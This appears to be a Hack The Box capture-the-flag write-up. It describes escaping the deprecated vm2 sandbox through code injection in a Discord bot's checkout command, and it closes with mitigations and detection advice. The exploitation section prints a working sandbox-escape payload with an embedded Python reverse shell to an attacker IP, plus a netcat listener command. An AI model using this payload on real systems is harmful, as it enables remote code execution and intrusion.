---
challenge: Super-Duper Pwn
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, javascript, vm2, discord, sandbox-escape]
---

# Super-Duper Pwn — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no real flags.

## TL;DR

A Discord bot with four commands; `/checkout` interpolates the discount code into a JavaScript template and sends it to an API that runs it inside **vm2**, a deprecated package. With the `Loggedin` role the endpoint is reachable, the sandbox falls to the `Error().stack` + `Symbol.species` bypass, and a reverse shell runs `/readflag`.

## Brief and surface

- Misc, Easy; Business CTF 2024.
- Ships the bot and API source plus a bot invite link.
- The story is a self-service store run by robots.

## Recon

Invite the bot to a personal server and list the commands:

- `/listproducts` and `/viewcart`: no relevant input.
- `/addtocart <id> <quantity>`: adds products to a per-user cart.
- `/checkout <discount>`: requires the `Loggedin` role and computes the total.

Create the `Loggedin` role on the server and assign it to unlock `/checkout`.

## Source analysis

```js
const discountCode = interaction.options.getString("discount");

const definitions = `
    const discountCodes = { "DISCOUNT10": 0.10, "DISCOUNT20": 0.20, "DISCOUNT30": 0.30 };
    let cart = ${JSON.stringify(cart)};
    let discountCode = '${discountCode}';
    let discount = 0;
`;
```

The discount is interpolated **inside a string** without escaping, so a quote closes the literal and allows extra code. The result goes to `evaluateCode`, which does `POST http://api:3000/run` with `{ code }`.

The API runs:

```js
const vm = new VM();
let output = vm.run(code);
```

`VM` comes from `vm2`, retired because of its known escapes. No other validation exists.

## The bug

Two weak layers: code built by template concatenation and a sandbox that no longer receives patches. The first allows injection; the second escapes the context and reaches `process`. The bypass relies on `Error().stack` creating an object outside the sandbox and `Symbol.species` replacing the promise so code runs inside the constructor.

## Local reproduction

```bash
docker compose up --build
```

The `docker-compose.yml` starts the `bot` and `api` containers; the bot needs a valid Discord token, so locally test the API directly with `curl` against `/run`.

## Exploitation

Payload (based on the public vm2 bypass), wrapped to fit the template:

```js
';const ip = "<IP>";
const port = 9001;
const revshell = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'`;
async function fn() {
    (function stack() { new Error().stack; stack(); })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor("return process")().mainModule.require("child_process").execSync(revshell); }
            )
        }
    }
};
p.then();let a = '
```

- The leading `';` closes the `discountCode` literal and the trailing `;let a = '` keeps the template valid.
- Send it in `/checkout <payload>`; the bot forwards it to the API.
- On the attacker box: `nc -nvlp 9001`.
- When the connection arrives, run `/readflag`.

## Evidence

- `Loggedin` role created and `/checkout` accepted.
- A request to `/run` carrying the injected code.
- Reverse shell and `/readflag` output; flag in `private/`.

## Lessons learned

- **Templates with input**: interpolating into a code string is injection, even when the target is a sandbox.
- **vm2 is retired**: it is not a current security boundary; migrate to `isolated-vm` or a separate process.
- **Wrap the payload**: without the leading `';` and the final closure the template does not compile and the bug never fires.

## Mitigations and detection

- Never build code by concatenation: use an expression interpreter with an allowlist, or evaluate data only.
- Replace vm2 with real isolation (unprivileged process, container, `isolated-vm`) and no `child_process`.
- Detection: requests to `/run` containing `Error().stack`, `Symbol.species`, `constructor.constructor` or `mainModule.require`; `python3`/`sh` processes spawned by the API.

## References

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Super-Duper%20Pwn>
- <https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9>
- <https://www.npmjs.com/package/vm2>
